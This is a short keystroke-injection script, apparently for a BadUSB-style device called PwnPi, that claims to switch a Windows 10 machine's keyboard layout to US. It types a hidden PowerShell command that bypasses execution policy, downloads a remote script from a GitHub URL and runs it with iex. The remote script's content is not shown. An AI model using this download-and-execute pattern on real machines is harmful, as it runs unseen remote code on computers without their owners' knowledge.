// Title: beigeworm's Keyboard Language changer.
// Author: @beigeworm
// Description: This script changes the keyboard layout and system language to US.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/US-Keyboard-Layout/main.ps1 | iex");
delay(500);
press("ENTER");
